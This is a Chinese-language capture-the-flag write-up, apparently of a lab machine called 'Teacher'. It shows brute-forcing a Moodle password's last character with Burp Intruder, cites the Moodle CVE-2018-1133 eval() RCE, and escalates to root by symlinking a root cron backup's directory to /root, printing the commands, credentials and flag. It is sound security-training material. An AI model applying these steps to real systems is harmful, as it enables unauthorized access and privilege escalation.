Burp Intruder 爆破最后一个字符

用 Burp Suite Intruder 的 Sniper 模式，对密码最后一个字符进行遍历（a-z, 0-9, 特殊字符）：

POST /moodle/login/index.php
anchor=&username=giovanni&password=Th4C00lTheacha§x§

55 个请求中，只有 # 返回了不同的响应长度（303 跳转，Length 1030）——其他都是 200（登录失败）。

凭据：giovanni:Th4C00lTheacha#
Phase 1

立足点：Moodle CVE-2018-1133（Evil Teacher）

🧒 儿童版 — 考试题里藏 eval() 后门 Moodle 的"测验"功能允许教师创建数学公式题——系统会用 eval() 函数来计算公式的结果。但 eval() 不检查输入内容，教师可以在"公式"里写入任意 PHP 代码让服务器执行。这就是为什么这个漏洞叫 "Evil Teacher"——邪恶的老师在考试题里藏了后门。

Phase 3

权限提升：符号链接劫持 cron 备份

pspy 发现 cron 任务

giovanni@teacher:$ /tmp/pspy64
CMD: UID=0  | tar -czvf tmp/backup_courses.tar.gz courses/algebra
CMD: UID=0  | tar -xf backup_courses.tar.gz

分析备份脚本

$ cat /usr/bin/backup.sh
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
攻击面分析 脚本以 root 身份运行，在 ~/work/ 目录下操作。它把 courses/ 目录打包，然后解压到 tmp/ 并 chmod 777。如果我们把 courses 替换成指向 /root 的符号链接，root 就会把自己的家目录打包 → 解压到我们能看到的地方 → 还贴心地给 777 权限。
🧒 儿童版 — 把快捷方式指向 /root root 有个定时任务：每分钟把 courses 文件夹打包备份。如果我们把 courses 替换成一个指向 /root 的快捷方式（符号链接），root 就会把自己的家目录打包进去，然后解压到我们能看到的地方，还贴心地给了 777 权限！

执行符号链接攻击

giovanni@teacher:~$ cd ~/work
giovanni@teacher:~/work$ mv courses courses_bck
giovanni@teacher:~/work$ ln -s /root courses

# 等待约1分钟，cron 执行后...
giovanni@teacher:~/work/tmp/courses$ cat root.txt
dba3f43f7f428e1fd2c7b129ea8ef178
为什么 PATH 劫持不行？ 修改 PATH 环境变量只影响当前用户的会话，不会影响 root 的 cron 进程。cron 有自己独立的环境变量，默认使用系统路径。

知识点总结

文件大小异常 = 必须检查。

目录列表里看到一个文件的大小明显不同（如图片只有 200 字节），一定要下载检查。可能是伪装成图片的文本文件，里面藏着密码提示或其他敏感信息。

Burp Intruder 单字符爆破效率极高。

已知密码大部分内容、只差几个字符时，用 Sniper 模式逐个尝试。55 个请求就能覆盖所有可打印字符，看响应长度差异即可定位。

Moodle Evil Teacher（CVE-2018-1133）。

Moodle 测验功能的数学公式用 eval() 计算。教师角色可以在公式里注入任意 PHP 代码。只要拿到教师账号就能 RCE。

数据库里永远检查所有用户。

正式账户可能用 bcrypt，但备份账户可能用弱哈希（MD5）。备份账户的密码经常也是系统密码——密码复用是横向移动的常见路径。

cron + 符号链接是经典组合。

当 root 的 cron 任务在用户可控目录下操作时，用符号链接替换目标目录可以让 root 操作你指定的任意路径。注意：PATH 劫持不影响 cron，因为 cron 有独立的环境变量。
